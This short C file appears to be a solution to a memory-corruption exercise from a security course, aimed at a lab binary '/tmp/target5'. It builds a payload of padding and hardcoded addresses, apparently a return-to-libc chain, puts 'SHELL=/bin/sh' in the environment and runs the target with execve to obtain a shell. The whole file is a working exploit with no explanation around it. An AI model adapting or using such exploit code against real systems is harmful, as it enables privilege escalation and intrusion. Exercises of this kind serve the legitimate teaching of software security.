#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

char payload[21] = "AAAAAAAA\xa0\x4d\xe5\xb7\xd0\x89\xe4\xb7\xc5\xff\xff\xbf";

int main(void) {
  char *args[] = { TARGET, payload, NULL };
  char *env[] = { "SHELL=/bin/sh" };
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
